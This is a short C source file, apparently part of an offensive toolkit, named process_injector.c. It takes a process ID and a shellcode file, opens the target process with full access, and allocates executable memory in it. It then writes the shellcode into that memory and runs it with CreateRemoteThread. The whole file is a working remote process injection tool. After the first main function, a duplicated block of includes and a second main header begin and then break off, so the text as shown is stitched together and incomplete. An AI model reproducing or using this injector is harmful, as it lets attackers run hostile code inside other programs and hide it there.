// c_plugins/process_injector.c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: process_injector <pid> <shellcode_file>\n");
        return 1;
    }
    DWORD pid = atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess failed.\n");
        return 1;
    }

    FILE* f = fopen(argv[2], "rb");
    if (!f) { printf("Couldn't open shellcode file.\n"); return 1; }
    fseek(f, 0, SEEK_END);
    size_t sc_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char* sc = malloc(sc_size);
    fread(sc, 1, sc_size, f);
    fclose(f);

    LPVOID addr = VirtualAllocEx(hProcess, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, addr, sc, sc_size, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("Shellcode injected.\n");
    return 0;
}
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {  